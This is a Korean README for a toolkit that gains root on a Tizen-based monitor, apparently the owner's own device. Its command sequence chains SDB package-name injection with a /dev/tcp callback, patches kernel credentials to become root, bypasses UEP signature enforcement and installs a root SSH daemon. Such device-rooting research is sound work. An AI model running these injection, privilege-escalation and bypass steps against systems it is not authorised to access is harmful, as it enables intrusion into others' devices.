# root-shell — 루트/셸 획득 도구

`docs/01-루트와-셸.md`에서 설명한 체인의 실제 파일입니다. 순서대로 실행하세요.

```sh
export M5_HOST=192.168.0.50     # 모니터
export M5_HOST_IP=192.168.0.2   # 이 스크립트를 돌리는 PC

# 1) sdk 셸 확인
python3 tvrun.py 'id'

# 2) root (probe.dll의 BecomeRoot)
python3 push2.py probe.dll /opt/usr/a/probe.dll
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll run "id"'

# 3) root 셸
python3 root_shell.py 'id; uname -a'

# 4) unsigned ELF용 UEP 패치
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll uepapply'
sleep 45
NOCB=1 python3 tvrun.py 'cp /tmp/managed_log.txt /tmp/l'
python3 tvrun.py 'grep -a apply /tmp/l'

# 5) SSH용 정적 바이너리 설치 (한 번만)
./install_tools.sh

# 6) ECDSA 키 생성 후 SSH 설치
mkdir -p keys
ssh-keygen -t ecdsa -b 256 -N '' -f keys/m5_ecdsa
python3 push2.py keys/m5_ecdsa.pub /opt/usr/home/owner/share/m5_ecdsa.pub
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll sshd'
sleep 80
ssh -i keys/m5_ecdsa -p 2222 root@$M5_HOST
```

## 파일

| 파일 | 역할 |
|---|---|
| `root_helper.cs` | `BecomeRoot()`(cred 스캔/패치), `shell`, `uepapply`, `sshd` 모드 |
| `uep_patch.cs` | UEP 판정 함수 탐색/패치 |
| `probe.dll` | 빌드된 관리 어셈블리 |
| `tvrun.py` | SDB 패키지명 인젝션 + `/dev/tcp` 콜백 |
| `tizen_sdb.py` | raw SDB 클라이언트 |
| `push2.py` | SDB 파일 전송 |
| `root_shell.py` | root TCP 셸 |
| `uepbypass.sh` | UEP 패치 + unsigned ELF 검증 |
| `install_tools.sh` | dropbear/dropbearkey/busybox 푸시 |
| `sshd2.sh` | UEP 재적용 + SSH 설치 + 로그인 검증 |
| `m5.sh` | 재부팅 후 복구 (UEP + dropbear) |
| `test_native.c` | unsigned ELF 검증용 |
| `dropbear`, `dropbearkey` | 정적 ARM 빌드 (`mzpqnxow/arm-dropbear-static`) |
| `busybox-armv7l` | BusyBox 1.31.0 정적 ARM |

## 주의

- `probe.dll`은 Tizen의 서명된 `dotnet-launcher`로만 실행됩니다. 일반 SSH 셸에서 직접 실행하면 `EPERM`입니다.
- UEP 패치 주소(`0x021D3B84`)는 이 펌웨어 기준입니다. 다른 펌웨어에서는 `uep_patch.cs`로 다시 찾아야 합니다.
- `keys/`의 개인키는 절대 커밋하지 마세요.
- 재부팅하면 UEP 패치, dropbear, bind-mount가 모두 사라집니다. `m5.sh`를 다시 실행하세요.
